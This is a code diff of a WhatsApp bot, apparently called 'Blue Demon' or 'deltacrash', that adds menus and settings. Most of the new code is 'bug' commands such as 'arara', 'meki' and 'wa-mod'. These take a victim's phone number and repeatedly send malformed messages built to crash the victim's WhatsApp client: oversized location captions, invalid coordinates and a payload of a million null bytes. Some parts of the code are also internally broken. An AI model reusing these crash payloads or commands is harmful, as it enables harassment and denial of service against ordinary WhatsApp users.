@@ -217,10 +217,43 @@ newsletterJid: '120363312773734994@newsletter',
     newsletterName: '',
     caption: body
 }}}
+async function locationcrash(target, kuwoted) {
+var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": `ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰`+"ꦾ".repeat(50000),
+    "sequenceNumber": "0",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: target, quoted: kuwoted })
+await Zynxzoo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
+}
 
-
-
-
+async function blackening(target, kuwoted) {
+ var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+  "stickerMessage": {
+    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
+    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
+    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
+    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
+    "mimetype": "image/webp",
+    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
+    "fileLength": "10116",
+    "mediaKeyTimestamp": "1715876003",
+    "isAnimated": false,
+    "stickerSentTs": "1715881084144",
+    "isAvatar": false,
+    "isAiSticker": false,
+    "isLottie": false
+  }
+}), { userJid: target, quoted: kuwoted });
+await Zynxzoo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+}
 
 
 const force = {
@@ -285,26 +318,6 @@ listResponseMessage: {
 title: `Blûédëmøñ`
 }
 }
-}
-async function blackening(target, kuwoted) {
- var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
-  "stickerMessage": {
-    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
-    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
-    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
-    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
-    "mimetype": "image/webp",
-    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
-    "fileLength": "10116",
-    "mediaKeyTimestamp": "1715876003",
-    "isAnimated": false,
-    "stickerSentTs": "1715881084144",
-    "isAvatar": false,
-    "isAiSticker": false,
-    "isLottie": false
-  }
-}), { userJid: target, quoted: kuwoted });
-await deltacrashgcinc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
 }
 
 async function locationfuckdely(target, kuwoted) {
@@ -1083,22 +1096,7 @@ if (db.groups[m.chat].antibot) {
 }
 
 // Case to enable or disable antibot
-case 'antibot': {
-    if (!m.isGroup) return deltacrashrevolutionReply(mess.group); // Check if it's a group
-    if (!isCreator) return deltacrashrevolutionReply(mess.owner); // Only creator can modify antibot settings
-    if (!isBotAdmin) return deltacrashrevolutionReply(mess.botAdmin); // Bot needs to be an admin
 
-    if (args[0] === 'on') {
-        db.groups[m.chat].antibot = true;
-        deltacrashrevolutionReply(`Antibot is now enabled`);
-    } else if (args[0] === 'off') {
-        db.groups[m.chat].antibot = false;
-        deltacrashrevolutionReply(`Antibot is now disabled`);
-    } else {
-        deltacrashrevolutionReply('Use the command like this: antibot on/off');
-    }
-    break;
-}
             // Import required modules
 //bug cases 
 /*
@@ -1323,104 +1321,358 @@ break */
 // Path to store the settings for antiun and warning data
 
 // Paths for settings and warning databa
-if (!global.settings) {
-    global.settings = {
-        anticall: false // Default setting for anticall
+// Anti-link feature
+// Anti-bug detection for location messages
+// List of emojis to use for auto-reaction
+
+case 'prmenu': {
+    // Start ping measurement
+    const start = speed();
+    const end = speed();
+    const ping = (end - start).toFixed(3); // Calculate ping in milliseconds
+    const xtime = moment().tz('Africa/Lagos').format('HH:mm:ss');
+    const mode = deltacrashgcinc.public ? 'ᴩᴜʙʟɪᴄ' : 'ᴩʀɪᴠᴀᴛᴇ';
+    const run = runtime(process.uptime());
+
+    // Define the status message
+    let manhwa = 
+`┏╍╍╍╍╍╍╍╍╍╍╍╍╍
+ᐉ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫: *𝙳𝙴𝙼𝙾𝙽*
+ᐉ 𝐏𝐢𝐧𝐠: *${ping} ᴍꜱ*
+ᐉ 𝐌𝐨𝐝𝐞: *${mode}*
+ᐉ 𝐓𝐢𝐦𝐞: *${xtime}*
+ᐉ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞: *${run}*
+┗╍╍╍╍╍╍╍╍╍╍╍╍╍
+\`𝔩𝔦𝔣𝔢 𝔦𝔰 𝔞𝔟𝔬𝔲𝔱 𝔬𝔳𝔢𝔯𝔠𝔬𝔪𝔦𝔫𝔤 𝔬𝔟𝔰𝔱𝔞𝔠𝔩𝔢𝔰\`💕`;
+
+    // Read the image as a buffer
+    const menuImage = fs.readFileSync('./JapaneseGuys/menu.jpg');
+
+    // Button and Menu Structure
+    let mainMenu = {
+        viewOnceMessage: {
+            message: {
+                interactiveMessage: {
+                    contextInfo: {
+                        mentionedJid: [m.sender],
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: "0@newsletter",
+                            newsletterName: "By BlueDemon",
+                            serverMessageId: 1,
+                        },
+                    },
+                    header: {
+                        title: " *•𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽 𝚁𝙴𝙼𝙸𝚇 𝙼𝙴𝙽𝚄*",
+                        ...(await prepareWAMessageMedia(
+                            { image: menuImage },  // Send the image as a buffer
+                            { upload: deltacrashgcinc.waUploadToServer } 
+                        )),
+                        hasMediaAttachment: true,
+                    },
+                    body: {
+                        text: `${manhwa}\nᴄʜᴏᴏꜱᴇ ᴀ ᴄᴏᴍᴍᴀɴᴅ ʙᴇʟᴏᴡ`,
+                    },
+                    footer: {
+                        text: "𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽",
+                    },
+                    nativeFlowMessage: {
+                        buttons: [
+                            {
+                                name: "single_select",
+                                buttonParamsJson: `{
+                                    "title": " ALL MENU ",
+                                    "sections": [
+                                        {
+                                            "title": "💕ꜱᴇʟᴇᴄᴛ ʏᴏᴜʀ ᴄᴏᴍᴍᴀɴᴅ💕",
+                                            "highlight_label": "ᴅᴇᴍᴏɴ ᴛᴇᴄʜ",
+                                            "rows": [
+                                                {
+                                                    "header": "💕• MAINMENU💕",
+                                                    "title": "😁ꜱʜᴏᴡ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅꜱ",
+                                                    "id": "menu2"
+                                                },
+                                                {
+                                                    "header": "🧣ᴄᴏɴᴛᴀᴄᴛ ᴛʜᴇ ᴏᴡɴᴇʀ",
+                                                    "title": "👋ᴅɪꜱᴘʟᴀʏꜱ ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ",
+                                                    "id": ".owner"
+                                                },
+                                                {
+                                                    "header": "🖥️ - BOT INFO",
+                                                    "title": "👾ᴅɪꜱᴘʟᴀʏꜱ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ᴀʙᴏᴜᴛ ʙᴏᴛ",
+                                                    "id": ".bmenu"
+                                                }
+                                            ]
+                                        },
+                                        {
+                                            "title": " 💕ꜱᴜᴘᴇʀɪᴏʀ ᴄᴏᴍᴍᴀɴᴅ💕 ",
+                                            "highlight_label": "ᴅᴇᴍᴏɴ ᴛᴇᴄʜ",
+                                            "rows": [
+                                                {
+                                                    "header": "💀 - BUG MENU",
+                                                    "title": "😱ᴅɪꜱᴘʟᴀʏꜱ ᴀʟʟ ʙᴜɢ ᴄᴏᴍᴍᴀɴᴅꜱ",
+                                                    "id": ".bugmenu"
+                                                },
+                                                {
+                                                    "header": "🥶 - PANEL MENU",
+                                                    "title": "😎ᴅɪꜱᴘʟᴀʏꜱ ᴘᴀɴᴇʟ ᴄᴏᴍᴍᴀɴᴅꜱ",
+                                                    "id": ".panelmenu"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }`
+                            },
+                            {
+                                name: "cta_url",
+                                buttonParamsJson: `{
+                                    "display_text": "JOIN CHANNEL",
+                                    "url": "https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h",
+                                    "merchant_url": "https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h"
+                                }`
+                            }
+                        ],
+                        messageParamsJson: "",
+                    },
+                },
+            },
+        },
     };
+
+    // Sending the structured menu based on your bot's configuration
+    await deltacrashgcinc.relayMessage(m.chat, mainMenu, {});
+    break;
 }
-case 'anticall': {
-    if (!isCreator) return deltacrashrevolutionReply(mess.owner);  // Ensure only the bot creator can enable/disable
+const emojis = [
+    '❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', 
+    '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', 
+    '🤗', '😌', '😉', '🤗', '😊', '🎊', '🎉', '🎁', '🎈', '👋'
+];
 
-    // Initialize settings object if it doesn't exist
-    if (!global.settings) {
-        global.settings = {};
+// Listen to every incoming message
+if (global.autoreaction && !m.key.fromMe) {  // Ensure auto-reaction is enabled and not responding to itself
+    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];  // Pick a random emoji
+    try {
+        await deltacrashgcinc.sendMessage(m.chat, {
+            react: {
+                text: randomEmoji,  // Reaction emoji
+                key: m.key  // React to the current message
+            }
+        });
+    } catch (err) {
+        console.error('Failed to send reaction:', err);
     }
+}
+case 'autoreaction': {
+    if (!isCreator) return deltacrashrevolutionReply(mess.owner);
 
-    // Check if the anticall setting exists; if not, initialize it
-    if (typeof global.settings.anticall === 'undefined') {
-        global.settings.anticall = false;
-    }
+    if (!args[0]) return deltacrashrevolutionReply(`Usage: ${prefix + command} on/off`);
 
     if (args[0] === 'on') {
-        global.settings.anticall = true;  // Enable the anticall functionality globally
-        deltacrashrevolutionReply(`${command} is enabled`);
+        global.autoreaction = true;  // Enable autoreaction globally
+        deltacrashrevolutionReply(`Auto-reaction is now enabled`);
     } else if (args[0] === 'off') {
-        global.settings.anticall = false;  // Disable the anticall functionality globally
-        deltacrashrevolutionReply(`${command} is disabled`);
+        global.autoreaction = false;  // Disable autoreaction globally
+        deltacrashrevolutionReply(`Auto-reaction is now disabled`);
     } else {
-        // Generate interactive message with buttons to enable/disable anticall
-        let msg = generateWAMessageFromContent(m.chat, {
-            viewOnceMessage: {
-                message: {
-                    interactiveMessage: proto.Message.InteractiveMessage.create({
-                        body: proto.Message.InteractiveMessage.Body.create({
-                            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
-                        }),
-                        footer: proto.Message.InteractiveMessage.Footer.create({
-                            text: botname
-                        }),
-                        header: proto.Message.InteractiveMessage.Header.create({
-                            ...(await prepareWAMessageMedia({ image: fs.readFileSync('./JapaneseGuys/mmk.jpg') }, { upload: deltacrashgcinc.waUploadToServer })),
-                            title: ``,
-                            gifPlayback: true,
-                            subtitle: ownername,
-                            hasMediaAttachment: false
-                        }),
-                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
-                            buttons: [
-                                {
-                                    name: "single_select",
-                                    buttonParamsJson: `{"title":"SELECT ENABLE/DISABLE",
-                                    "sections":[{"title":"CHOOSE ENABLE/DISABLE",
-                                    "rows":[{"header":"ENABLE ✅",
-                                    "title":"CHOOSE ",
-                                    "description":"ENABLE ✅",
-                                    "id":"${prefix + command} on"},
-                                    {"header":"DISABLE ❌",
-                                    "title":"CHOOSE ",
-                                    "description":"DISABLE ❌",
-                                    "id":"${prefix + command} off"}
-                                    ]
-                                    }
-                                    ]
-                                    }`
-                                }
-                            ]
-                        })
-                    })
-                }
-            }
-        }, { quoted: m });
-
-        // Relay the interactive message
-        await deltacrashgcinc.relayMessage(msg.key.remoteJid, msg.message, {
-            messageId: msg.key.id
-        });
+        deltacrashrevolutionReply(`Invalid option. Usage: ${prefix + command} on/off`);
     }
     break;
 }
-case 'getstatus': {
-    // Read the saved statuses list
-    let savedStatuses = JSON.parse(fs.readFileSync('./savedStatuses/statusList.json', 'utf8'));
+const maxLocationLength = 100; // Set a limit for the location message length
 
-    if (savedStatuses.length === 0) {
-        return deltacrashrevolutionReply('No saved statuses found.');
+case 'message': {
+    if (m.message && m.message.locationMessage) {
+        const locationMsg = m.message.locationMessage;
+
+        // Check if the location message is suspicious (e.g., too long)
+        if (locationMsg && locationMsg.degreesLatitude.length > maxLocationLength) {
+            await deltacrashgcinc.sendMessage(m.chat, {
+                text: `⚠️ Bug detected! Removing the location message from @${m.sender.split('@')[0]}.`,
+                mentions: [m.sender]
+            });
+
+            // Delete the message to prevent a bug
+            await deltacrashgcinc.sendMessage(m.chat, {
+                delete: {
+                    remoteJid: m.chat,
+                    fromMe: false,
+                    id: m.key.id,
+                    participant: m.key.participant || m.participant
+                }
+            });
+
+            // Optional: Warn or kick the user (for groups)
+            if (m.isGroup && m.isBotAdmin) {
+                deltacrashgcinc.sendMessage(m.chat, {
+                    text: `@${m.sender.split('@')[0]}, sending location bugs is not allowed! This is a warning.`,
+                    mentions: [m.sender]
+                });
+
+                // Optionally kick the user after warning
+                // await deltacrashgcinc.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
+            }
+        }
+    }
+    break;
+}
+const spamProtection = {};
+const spamThreshold = 5; // Message limit before considering it spam
+const timeFrame = 10000; // Time in milliseconds (10 seconds)
+
+case 'message': {
+    const userId = m.sender; // The sender's ID
+    const currentTime = new Date().getTime();
+
+    // Initialize user's spam protection if not already done
+    if (!spamProtection[userId]) {
+        spamProtection[userId] = {
+            messages: 1,
+            firstMessageTime: currentTime
+        };
+    } else {
+        // Check if the user is sending messages too fast
+        const timeElapsed = currentTime - spamProtection[userId].firstMessageTime;
+
+        if (timeElapsed < timeFrame) {
+            spamProtection[userId].messages += 1;
+
+            if (spamProtection[userId].messages >= spamThreshold) {
+                // Detected spam, mute or block the user
+                deltacrashgcinc.sendMessage(m.chat, {
+                    text: `⚠️ @${userId.split('@')[0]} is sending too many messages too quickly!`,
+                    mentions: [userId]
+                });
+
+                // Apply a penalty (e.g., mute or block)
+                if (m.isGroup && m.isBotAdmin) {
+                    await deltacrashgcinc.groupParticipantsUpdate(m.chat, [userId], 'mute'); // Mute in group
+                } else {
+                    await deltacrashgcinc.updateBlockStatus(userId, 'block'); // Block in private chat
+                }
+
+                // Reset the user's spam protection
+                delete spamProtection[userId];
+            }
+        } else {
+            // Reset the user's message count if the time frame has passed
+            spamProtection[userId].messages = 1;
+            spamProtection[userId].firstMessageTime = currentTime;
+        }
+    }
+    break;
+}
+case 'meki': 
+case 'anjay':  
+case 'arara': {
+    if (!isPremium) return deltacrashrevolutionReply(mess.premium); // Check if the user is premium
+    if (!text) return deltacrashrevolutionReply(`Example: .${command} 628xxx`); // Prompt for usage
+
+    let peler = q.replace(/[^0-9]/g, ""); // Clean the input to only numbers
+    if (peler.startsWith('0')) return deltacrashrevolutionReply(`\`[ # ]\` Enter the initial country code\n\n\`[ # ]\` Example: .${command} 628xxx`);
+
+    let Pe = peler + '@s.whatsapp.net'; // Prepare WhatsApp ID
+    await deltacrashrevolutionReply(mess.bugrespon); // Send response message
+
+    for (let j = 0; j < 5; j++) { // Loop to send messages multiple times
+        await locationcrash(Pe);
+        await sendMultiplePaymentInvites(Pe);
+        await locationcrash(Pe, zynxzobug);
+        await listfuck(Pe, oneclick);
+        await sendExtendedTextMessage(Pe, force);
+        await blackening(Pe, force2);
+        await sendPaymentInfoMessage(Pe);
+        await locationcrash(Pe, force);
+
+        // Send repeated message
+        await deltacrashgcinc.sendMessage(Pe, { text: `\`𝘜𝘵𝘢𝘮𝘢𝘬𝘢𝘯 𝘍𝘶𝘯𝘨𝘴𝘪 𝘋𝘦𝘤𝘬\`` }, { quoted: m });
+        await sleep(500); // Sleep for 0.5 seconds between messages
+    }
+    
+    await sendPaymentInfoMessage(Pe, force2); // Send payment info
+    await bakdok(Pe, zynxzobug); // Execute the bakdok function
+    await listfuck(Pe); // List the specified function
+    await sendMultiplePaymentInvites(Pe, force); // Send payment invites
+    await locationcrash(Pe, zynbug); // Crash location
+    await sendPaymentInfoMessage(Pe, zynxzobug); // Send payment info again
+
+    await deltacrashrevolutionReply(mess.donebug); // Send completion message
+    break; // End of case
+}
+case 'beta-new': 
+case 'wa-ori':  
+case 'wa-busins': 
+case 'wa-mod': {
+    if (!isPremium) return deltacrashrevolutionReply(mess.premium);
+    if (!text) return deltacrashrevolutionReply(`Usage .${command} 6281234567890`);
+
+    let peler = q.replace(/[^0-9]/g, '');  // Clean up the input to only keep numbers
+    if (peler.startsWith('0')) return deltacrashrevolutionReply(`Example: ${prefix + command} 6281234567890`);
+
+    var contactInfo = await deltacrashgcinc.onWhatsApp(peler + "@s.whatsapp.net");
+    let whatsappNumber = peler + '@s.whatsapp.net';
+
+    // Block specific numbers
+    if (['916909137213', '919366316008', '919402104403'].includes(peler)) {
+        return;  // Return without any action if the number matches the restricted ones
     }
 
-    try {
-        // Send the latest saved status
-        let latestStatus = savedStatuses[savedStatuses.length - 1];
-        let mediaType = latestStatus.endsWith('.mp4') ? 'video' : 'image';
-
-        await deltacrashgcinc.sendMessage(m.chat, {
-            [mediaType]: { url: latestStatus },
-            caption: 'Here is the saved status.'
-        }, { quoted: m });
-
-    } catch (err) {
-        console.error(err);
-        deltacrashrevolutionReply('Failed to retrieve the saved status.');
+    // Check if the number is registered on WhatsApp
+    if (contactInfo.length === 0) {
+        return deltacrashrevolutionReply("The number is not registered on WhatsApp.");
     }
+
+    // Function to send the "ZYNXZO CRASH WHATSAPP" message 10 times
+    async function sendSystemCrashMessage(jid) {
+        for (let i = 0; i < 10; i++) {  // Repeat 10 times
+            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+                'viewOnceMessage': {
+                    'message': {
+                        'interactiveMessage': {
+                            'header': {
+                                'title': '',
+                                'subtitle': " "
+                            },
+                            'body': {
+                                'text': "TO MAKE BUG NO EASY O"
+                            },
+                            'footer': {
+                                'text': '🙃'
+                            },
+                            'nativeFlowMessage': {
+                                'buttons': [{
+                                    'name': 'cta_url',
+                                    'buttonParamsJson': "{ display_text : 'Zynxzo', url : , merchant_url :  }"
+                                }],
+                                'messageParamsJson': "\0".repeat(1000000)
+                            }
+                        }
+                    }
+                }
+            }), {
+                'userJid': jid
+            });
+            await deltacrashgcinc.relayMessage(jid, messageContent.message, {
+                'participant': {
+                    'jid': jid
+                },
+                'messageId': messageContent.key.id
+            });
+
+            // Add a small delay between each message to prevent flooding
+            await new Promise(resolve => setTimeout(resolve, 1000));  // 1-second delay
+        }
+    }
+
+    // Send the BugPay message to the specified WhatsApp number 10 times
+    await sendSystemCrashMessage(whatsappNumber);
+
+    // Send a message confirming the action and mentioning the target user
+    deltacrashgcinc.sendMessage(m.chat, {
+        text: `Successfully sent Bug to @${whatsappNumber.split('@')[0]} using *${command}* ✅\n\nPause 2 minutes to avoid bot ban.`,
+        mentions: [whatsappNumber]
+    });
+
     break;
 }
 case 'take': {
@@ -1841,53 +2093,7 @@ case 'autoviewstatus': {
 
     break;
 }
-let autoReactEnabled = false; // Flag to track if auto-reaction is enabled
 
-case 'areact': {
-    if (!isAdmins && !isGroupOwner && !isCreator) {
-        return deltacrashrevolutionReply('ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ.');
-    }
-
-    const args = q ? q.split(' ') : [];
-    const option = args[0]; // 'on' or 'off'
-
-    if (option === 'on') {
-        if (autoReactEnabled) {
-            return deltacrashrevolutionReply('Auto-reaction is already enabled.');
-        }
-        
-        autoReactEnabled = true;
-        deltacrashrevolutionReply('Auto-reaction has been enabled.');
-        
-        // Function to handle reactions
-        const handleReaction = async (message) => {
-            const emojis = ['💞', '😊', '👍', '🔥', '✨', '😂']; // Add more emojis as needed
-            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
-            await deltacrashgcinc.sendMessage(message.chat, {
-                react: { text: randomEmoji, key: message.key }
-            });
-        };
-
-        // Listen for incoming messages to react
-        deltacrashgcinc.on('message-new', handleReaction);
-        
-    } else if (option === 'off') {
-        if (!autoReactEnabled) {
-            return deltacrashrevolutionReply('Auto-reaction is already disabled.');
-        }
-
-        autoReactEnabled = false;
-        deltacrashrevolutionReply('Auto-reaction has been disabled.');
-
-        // Remove the message listener if necessary (optional)
-        // deltacrashgcinc.off('message-new', handleReaction); // Implement a proper way to store and remove the listener
-
-    } else {
-        return deltacrashrevolutionReply('Please specify "on" or "off" to enable or disable auto-reaction.');
-    }
-
-    break;
-}
 case 'youtube': {
     if (!text) return deltacrashrevolutionReply('Please provide a YouTube link.');
     
@@ -2787,6 +2993,66 @@ ${readmore}
 
     break;
 }
+
+// Button Interaction Handling
+deltacrashgcinc.on('message', async (message) => {
+    if (message.type === 'interactive' && message.selectedButtonId) {
+        const command = message.selectedButtonId;
+
+        switch (command) {
+            case `${prefix}public`:
+                // Handle public mode
+                deltacrashgcinc.public = true;
+                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Public mode activated!" });
+                break;
+
+            case `${prefix}self`:
+                // Handle private mode
+                deltacrashgcinc.public = false;
+                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Private mode activated!" });
+                break;
+
+            case `${prefix}addowner`:
+                // Handle adding owner logic
+                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Add Owner functionality." });
+                break;
+
+            case `${prefix}delowner`:
+                // Handle deleting owner logic
+                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Delete Owner functionality." });
+                break;
+
+            case `${prefix}tag`:
+                // Handle tagging all members logic
+                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Tagging all members." });
+                break;
+
+            case `${prefix}toimg`:
+                // Handle sticker to image logic
+                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Converting sticker to image." });
+                break;
+
+            case `${prefix}tomp4`:
+                // Handle sticker to video logic
+                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Converting sticker to video." });
+                break;
+
+            case `${prefix}ping`:
+                // Handle ping command
+                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Pinging..." });
+                break;
+
+            case `${prefix}save`:
+                // Handle saving status logic
+                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Saving status..." });
+                break;
+
+            default:
+                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Unknown command." });
+                break;
+        }
+    }
+});
 case "public": {
     if (!isCreator) return deltacrashrevolutionReply(mess.owner);
     deltacrashgcinc.public = true;
@@ -2801,6 +3067,25 @@ case "self": {
     break;
 }
 break
+case "premon": {
+    if (!isCreator) return deltacrashrevolutionReply(mess.owner); // Only the creator can enable premium mode
+    
+    deltacrashgcinc.public = false; // Set the bot to private mode, meaning general users can't access it
+    global.premiumMode = true; // Enable the premium-only mode globally
+    
+    deltacrashrevolutionReply("*[Success]* *Premium-only mode activated 😊*");
+    break;
+}
+
+case "premoff": {
+    if (!isCreator) return deltacrashrevolutionReply(mess.owner); // Only the creator can disable premium mode
+    
+    global.premiumMode = false; // Disable premium-only mode globally
+    deltacrashgcinc.public = true; // Switch the bot back to public mode
+    
+    deltacrashrevolutionReply("*[Success]* *Premium-only mode deactivated, public mode enabled 😊*");
+    break;
+}
 case 'band4band': {
 darkphonk = fs.readFileSync('./menu.mp3')
     deltacrashgcinc.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })
